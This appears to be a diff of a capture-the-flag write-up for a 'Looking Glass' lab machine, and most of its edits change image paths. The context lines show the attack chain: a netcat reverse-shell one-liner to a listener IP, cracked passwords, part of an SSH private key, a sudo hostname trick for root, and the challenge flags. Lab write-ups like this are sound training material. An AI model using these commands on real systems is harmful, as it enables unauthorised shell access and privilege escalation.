@@ -213,11 +213,11 @@ Let's begin exploitation.
 As seen, this is a `vigenere cipher`, let's try to decode it:
 
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610224830.png)
+![](cybersecurity/images/Pasted%2520image%252020250610224830.png)
 
 We got the key, use it to decode:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610231128.png)
+![](cybersecurity/images/Pasted%2520image%252020250610231128.png)
 
 As seen, we get the secret:
 
@@ -236,7 +236,7 @@ jabberwock:NeedlesShynessPeaceStreaming
 
 This password changes each time you reset the machine, you need to do the testing for ports and this step if you reset the machine or it gets shut down, we can go into ssh now:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610231410.png)
+![](cybersecurity/images/Pasted%2520image%252020250610231410.png)
 
 We can now begin privilege escalation.
 
@@ -302,7 +302,7 @@ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.14.21.28 9001 >/t
 
 Now, let's reboot while we have our listener ready:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610232024.png)
+![](cybersecurity/images/Pasted%2520image%252020250610232024.png)
 
 Once it reboots, we get our shell, let's stabilize it:
 
@@ -316,7 +316,7 @@ export TERM=xterm
 export BASH=bash
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610232117.png)
+![](cybersecurity/images/Pasted%2520image%252020250610232117.png)
 
 We are `tweedledum`, let's check our home directory:
 
@@ -349,15 +349,15 @@ b9776d7ddf459c9ad5b0e1d6ac61e27befb5e99fd62446677600d7cacef544d0
 
 If we analyze them, they seem like a series of hashes, let's use crackstation to check:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610232252.png)
+![](cybersecurity/images/Pasted%2520image%252020250610232252.png)
 
 Only the last one if not `sha256`, let's try to analyze it:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610232341.png)
+![](cybersecurity/images/Pasted%2520image%252020250610232341.png)
 
 This is hex encoded, we can decode it in the same website:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610232423.png)
+![](cybersecurity/images/Pasted%2520image%252020250610232423.png)
 
 We got a password:
 
@@ -408,7 +408,7 @@ alice:x:1005:1005:Alice,,,:/home/alice:/bin/bash
 
 Pretty obvious this is the password for the `humptydumpty` user, let's switch then:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610232612.png)
+![](cybersecurity/images/Pasted%2520image%252020250610232612.png)
 
 ```
 humptydumpty@looking-glass:~$ ls -la
@@ -597,10 +597,10 @@ k6ywCnCtTz2/sNEgNcx9/iZW+yVEm/4s9eonVimF+u19HJFOPJsAYxx0
 
 Save it and go into ssh with that:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610233743.png)
+![](cybersecurity/images/Pasted%2520image%252020250610233743.png)
 Let's check valuable stuff for it, we can use `linpeas`:
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610233939.png)
+![](cybersecurity/images/Pasted%2520image%252020250610233939.png)
 
 As seen, the sudoers file has something on it, we got:
 
@@ -614,7 +614,7 @@ We can abuse this to get a shell as root by doing:
 sudo -h ssalg-gnikool /bin/bash
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610234029.png)
+![](cybersecurity/images/Pasted%2520image%252020250610234029.png)
 
 Nice, we were able to get root, let's get both flags:
 
@@ -637,5 +637,5 @@ root@looking-glass:/tmp# cat /root/root.txt | rev
 thm{bc2337b6f97d057b01da718ced6ead3f}
 ```
 
-![](CYBERSECURITY/IMAGES/Pasted%20image%2020250610234200.png)
+![](cybersecurity/images/Pasted%2520image%252020250610234200.png)
 
